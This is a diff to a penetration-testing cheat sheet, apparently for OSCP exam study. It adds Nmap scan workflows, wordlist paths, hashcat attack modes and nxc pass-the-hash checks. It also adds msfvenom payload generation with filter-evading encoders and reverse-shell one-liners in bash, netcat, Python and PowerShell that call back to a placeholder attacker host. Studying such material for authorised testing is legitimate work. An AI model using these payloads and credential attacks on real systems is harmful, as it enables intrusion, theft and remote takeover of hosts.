@@ -2,10 +2,18 @@
 
 ## 1. Nmap — Scanning
 
+### Recommended sequence (first pass on a new host)
+1. Fast full TCP port sweep, no scripts (below) — find what's actually open before spending time on `-sC`/`-sV`.
+2. Feed those ports into a targeted `-sC -sV` scan (below) — much faster than a `-p- -sC -sV -O` run against all 65535 ports.
+3. Kick off the UDP top-100 sweep in the background in parallel with 1–2 — UDP-only services (SNMP, TFTP, NFS, DNS) are the easiest ports to miss on OSCP boxes.
+4. Once services are fingerprinted, run `--script vuln` / `nmap-vulners` to flag obvious CVEs before manual digging.
+5. Optionally run AutoRecon alongside 1–4 as a safety net (`notes/enum-automation-frameworks.md`) — don't block on it, keep enumerating manually in the foreground.
+
 ### Initial full TCP port discovery (fast, all ports)
 ```bash
-nmap -p- --min-rate=1000 -T4 -oN nmap-allports.txt <target>
+nmap -p- --min-rate=1000 -T4 -oA nmap-allports <target>
 ```
+Use `-oA` (not just `-oN`) here — the targeted-rescan step below greps the `.gnmap` output this produces.
 
 ### Full TCP scan with service/version detection + default scripts
 ```bash
@@ -30,19 +38,30 @@ nmap -p- -sC -sV -O -oA nmap-full <target>
 -T4      Aggressive timing (T0 slowest - T5 fastest)
 --open   Show only open ports
 -A       Aggressive: OS detect + version + scripts + traceroute
+-6       Scan an IPv6 target (combine with -sS/-sC/-sV/-p- as normal)
 ```
+
+### IPv6 target
+```bash
+nmap -6 -p- -sC -sV -oA nmap-ipv6 <target-ipv6-address-or-scope-id>
+```
+Same flags as IPv4 — just add `-6` and pass the IPv6 literal (link-local addresses need a zone/scope ID, e.g. `fe80::1%eth0`). Relevant mainly on AD segments where mitm6 is in play (`notes/password-attacks-advanced.md`) or a host is dual-stack; standalone OSCP boxes are IPv4 almost always.
 
 ### UDP scan (top ports — full UDP is slow, scope common ports first)
 ```bash
-nmap -sU --top-ports 100 -T4 -oN nmap-udp-top100.txt <target>
-sudo nmap -sU -p- --min-rate=1000 -T4 -oN nmap-udp-all.txt <target>
+nmap -sU --top-ports 100 -T4 -oA nmap-udp-top100 <target>
+sudo nmap -sU -p- --min-rate=1000 -T4 -oA nmap-udp-all <target>
 ```
 
 ### Feed discovered open ports back into a targeted deep scan
 ```bash
-# Extract open ports from previous grepable output
+# Extract open TCP ports from previous grepable output
 ports=$(grep -oP '\d{1,5}(?=/open)' nmap-allports.gnmap | tr '\n' ',' | sed 's/,$//')
 nmap -p$ports -sC -sV -oN nmap-targeted.txt <target>
+
+# Same pattern for UDP — version/script-scan just the UDP ports found open above
+udp_ports=$(grep -oP '\d{1,5}(?=/open/udp)' nmap-udp-top100.gnmap | tr '\n' ',' | sed 's/,$//')
+sudo nmap -sU -p$udp_ports -sC -sV -oN nmap-udp-targeted.txt <target>
 ```
 
 ### NSE vulnerability scripts
@@ -51,7 +70,7 @@ nmap -p$ports -sC -sV -oN nmap-targeted.txt <target>
 nmap -p- -sV --script vuln -oN nmap-vuln.txt <target>
 
 # Common specific NSE scripts used on OSCP
-nmap -p445 --script smb-vuln* <target>
+nmap -p445 --script "smb-vuln*" <target>
 nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <target>
 nmap -p139,445 --script smb-vuln-ms17-010 <target>          # EternalBlue check
 nmap -p21 --script ftp-anon,ftp-syst <target>
@@ -63,7 +82,7 @@ nmap -p3306 --script mysql-info,mysql-empty-password <target>
 nmap -p1433 --script ms-sql-info,ms-sql-empty-password <target>
 nmap -p161 -sU --script snmp-info,snmp-processes,snmp-netstat <target>
 nmap --script http-enum -p80,443 <target>
-nmap --script http-vuln* -p80,443 <target>
+nmap --script "http-vuln*" -p80,443 <target>
 nmap --script "default,vuln" -oA nmap-vulnscan <target>
 
 # Set script args (e.g. userdb for brute scripts)
@@ -90,7 +109,7 @@ nmap -sV --script vulners --script-args mincvss=7.0 -p- <target>   # only CVSS >
 ### gobuster (dir mode)
 ```bash
 gobuster dir -u http://<target> \
-  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
   -x php,txt,html,bak -t 50 -o gobuster-dir.txt
 
 # Common flags
@@ -153,12 +172,12 @@ ffuf -u http://<target> -H "Host: FUZZ.<domain>" \
 ffuf -u http://<target>/login -X POST \
   -d "username=admin&password=FUZZ" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top1000.txt \
+  -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
   -fc 401
 
 # Common flags
 -u    URL with FUZZ keyword
--w    wordlist (can prefix KEYWORD: for multiple)
+-w    wordlist (append :KEYWORD, e.g. -w list1.txt:FUZZ1 -w list2.txt:FUZZ2, for multiple simultaneous wordlists)
 -X    HTTP method
 -d    POST data
 -H    header
@@ -176,8 +195,8 @@ ffuf -u http://<target>/login -X POST \
 ### Directories / files (web content)
 ```
 /usr/share/seclists/Discovery/Web-Content/common.txt
-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 /usr/share/seclists/Discovery/Web-Content/big.txt
@@ -200,17 +219,17 @@ ffuf -u http://<target>/login -X POST \
 
 ### Passwords
 ```
-/usr/share/seclists/Passwords/rockyou.txt                     # (gunzip -k /usr/share/wordlists/rockyou.txt.gz on Kali)
-/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top1000.txt
+/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
 /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-/usr/share/seclists/Passwords/probable-v2-top1575.txt
+/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt
 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
 ```
 
 ### SNMP / Common misc
 ```
 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+/usr/share/seclists/Discovery/SNMP/snmp.txt
 /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
 ```
 
@@ -252,6 +271,18 @@ gunzip /usr/share/wordlists/rockyou.txt.gz    # extracts to /usr/share/wordlists
 | Django (PBKDF2-SHA256)               | 10000     | |
 | Oracle 11g                           | 112       | |
 | Wordpress (phpass)                   | 400       | |
+| JWT (HS256)                          | 16500     | crack the HMAC secret of a JSON Web Token |
+| KeePass 1/2 (.kdbx)                  | 13400     | via keepass2john |
+
+### `-a` Attack Mode Primer
+```
+-a 0   Straight (wordlist)                    hashcat -m 0 hash.txt wordlist.txt
+-a 1   Combinator (wordlist1 x wordlist2)      hashcat -m 0 hash.txt wordlist1.txt wordlist2.txt
+-a 3   Brute-force / mask                      hashcat -m 0 hash.txt ?d?d?d?d?d?d?d?d
+-a 6   Hybrid wordlist + mask (append)         hashcat -m 0 hash.txt wordlist.txt ?d?d     (e.g. password + 2 digits)
+-a 7   Hybrid mask + wordlist (prepend)        hashcat -m 0 hash.txt ?d?d wordlist.txt
+```
+Mask charsets: `?l` lower, `?u` upper, `?d` digit, `?s` special, `?a` all.
 
 ### Common hashcat invocation patterns
 ```bash
@@ -277,9 +308,17 @@ hashcat -m 1000 hashes.txt --show
 hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d
 ```
 
+**Faster (nxc):** once a hash cracks (or even without cracking, for pass-the-hash), validate it directly against the target instead of hand-testing logins:
+```bash
+nxc smb <target_or_range> -u <user> -p <cracked_password>
+nxc smb <target_or_range> -u <user> -H <ntlm_hash>   # pass-the-hash, no cracking needed
+```
+
 ---
 
 ## 5. msfvenom Payload Generation
+
+**Exam scope reminder:** Metasploit/Meterpreter (including msfvenom-generated `meterpreter` payloads and `msf` exploit modules) may be used against only ONE non-AD exam machine for the whole exam, and never for pivoting. Prefer the non-meterpreter `shell_reverse_tcp`/`cmd` payloads below for everything else.
 
 ### Windows reverse shell (EXE)
 ```bash
@@ -303,6 +342,7 @@ msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=443 -f raw -o shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp -o shell.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx -o shell.aspx
 ```
+- If the target IIS app pool is 64-bit only (`Enable 32-Bit Applications` = False), the x86 payload above fails to load — use `windows/x64/meterpreter/reverse_tcp` (or `windows/x64/shell_reverse_tcp`) instead.
 
 ### JSP / WAR (Tomcat)
 ```bash
@@ -318,11 +358,23 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<attacker_ip> LPORT=443 -f raw -o shell.
 
 ### Encoded / staged options (bypass basic filters)
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+msfvenom -p windows/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
   -e x86/shikata_ga_nai -i 5 -f exe -o shell_enc.exe
+
+# x64 payload requires an x64-compatible encoder (shikata_ga_nai is x86-only)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+  -e x64/xor_dynamic -i 5 -f exe -o shell_enc_x64.exe
 
 # Common -f formats: exe, elf, raw, war, asp, aspx, jsp, psh (powershell), dll, macho
 ```
+
+### Raw shellcode for BOF/exploit-dev (bad-char avoidance)
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+  -b '\x00\x0a\x0d' -f c -o shellcode.txt
+```
+- `-b '<bad chars>'` excludes bytes that break the target's input handling (e.g. `\x00\x0a\x0d`) — determine the full bad-char list first with a `\x00-\xff` bytearray send + response comparison before generating final shellcode.
+- `-f c` (or `-f python`/`-f raw`) for pasting into an exploit script rather than a standalone binary.
 
 ---
 
@@ -333,15 +385,26 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
 | **Bash** | `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1` |
 | **Bash (alt)** | `0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196` |
 | **Netcat (classic)** | `nc -e /bin/sh <attacker_ip> <port>` |
-| **Netcat (no -e)** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <attacker_ip> <port> >/tmp/f` |
-| **Netcat (OpenBSD, -c)** | `nc -c /bin/sh <attacker_ip> <port>` |
+| **Netcat (no -e)** | contains a `\|` pipe — see fenced block below (table cells can't hold a literal `\|` safely) |
+| **Netcat (traditional/GNU, -e)** | `nc.traditional -e /bin/sh <attacker_ip> <port>` (OpenBSD `nc`, the Kali/Debian default, strips `-e`/`-c` execution support — use `nc.traditional` or `ncat --exec /bin/sh <attacker_ip> <port>` instead) |
 | **Python3** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` |
-| **PowerShell** | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` |
+| **PowerShell** | contains `\|` pipes — see fenced block below (table cells can't hold a literal `\|` safely) |
 | **PHP** | `php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` |
 | **Perl** | `perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
 | **socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>` |
 | **Listener (attacker)** | `nc -lvnp <port>` |
 | **Listener (rlwrap, stable)** | `rlwrap nc -lvnp <port>` |
+| **Listener (socat, full PTY)** | `socat file:$(tty),raw,echo=0 tcp-listen:<port>` — pair with the socat payload above to keep raw-tty/job-control instead of a bare shell |
+
+Commands with literal pipes, kept out of the table above (raw markdown escapes `\|` for GFM table cells — paste from these fenced blocks, not the table, to avoid copying stray backslashes):
+```bash
+# Netcat (no -e), mkfifo named-pipe shell
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
+```
+```powershell
+# PowerShell TCP reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
 ### Shell stabilization (after landing on Linux target)
 ```bash
@@ -363,15 +426,15 @@ Once `nmap -sV` (or banner grabbing) gives you a product and version string, fee
 
 | Tool / Site | Type | Query pattern | Notes |
 |---|---|---|---|
-| **searchsploit** (offline Exploit-DB mirror, ships with Kali) | CLI | `searchsploit wordpress 4.7` | Fastest first check, no network needed; `-w` prints the online exploit-db.com URL, `-m <id>` copies a PoC locally |
+| **searchsploit** (offline Exploit-DB mirror, ships with Kali) | CLI | `searchsploit wordpress 4.7` | Fastest first check, no network needed; `-w` prints the online exploit-db.com URL, `-m <id>` copies a PoC locally; `searchsploit --nmap nmap-full.xml` (requires `-oX`/`-oA` nmap XML output) auto-cross-references every detected service/version in one shot |
 | [Exploit-DB](https://www.exploit-db.com/search) | Web | Product + version filter fields | Canonical source `searchsploit` mirrors; check here if the local DB is stale |
 | [vulners.com](https://vulners.com/) | Web + API | `wordpress 4.7` in the search bar | Aggregates NVD/CVE + vendor advisories + exploit refs in one result list; backs the `nmap-vulners` NSE script above |
 | [cvedetails.com version search](https://www.cvedetails.com/version-search.php) | Web | Vendor / product / version dropdowns | Best when you know exact vendor+product; supports one trailing wildcard (e.g. `4.7*`); results cap at 100 per query so add the version to narrow a popular product |
 | [NVD search](https://nvd.nist.gov/vuln/search) | Web + API | Keyword search, e.g. `vsftpd 2.3.4` | Authoritative CVE descriptions/CVSS/CPE; slower to update with exploit links than vulners/Exploit-DB |
 | [sploitus.com](https://sploitus.com/) | Web | `apache struts 2.3` | Search engine over Exploit-DB, Metasploit, GitHub PoC repos, and Packet Storm in one query |
-| [Rapid7 Vulnerability & Exploit DB](https://www.rapid7.com/db/) | Web | `<product> <version>` search box | Cross-links matching Metasploit module names directly — useful to jump straight to `msfconsole` |
+| [Rapid7 Vulnerability & Exploit DB](https://www.rapid7.com/db/) | Web | `<product> <version>` search box | Cross-links matching Metasploit module names directly — useful to jump straight to `msfconsole` (remember the one-machine, non-AD, no-pivoting Metasploit exam limit before firing the module) |
 | [Packet Storm Security](https://packetstormsecurity.com/search/?q=) | Web | `<product> <version>` | Good secondary source when Exploit-DB has no PoC for a niche CVE |
-| `msf > search` (Metasploit) | CLI | `search type:exploit name:wordpress` or `search cve:2021-41773` | Cross-check once you have a candidate CVE — confirms whether a ready module exists before hand-rolling a PoC |
+| `msf > search` (Metasploit) | CLI | `search type:exploit name:wordpress` or `search cve:2021-41773` | Cross-check once you have a candidate CVE — confirms whether a ready module exists before hand-rolling a PoC; actually running an exploit module still counts against the one-machine Metasploit exam limit |
 | [GitHub Advisory DB](https://github.com/advisories) | Web | Filter by ecosystem + package name/version | Best for app-level library CVEs (npm/pip/composer/gem packages) rather than network services |
 
 **Workflow tip:** run `searchsploit <product> <version>` first (fast, offline, works without exam network egress concerns), then confirm/deepen with `vulners.com` or `nvd.nist.gov` if searchsploit comes up empty or you need the full CVE writeup for the exam report.
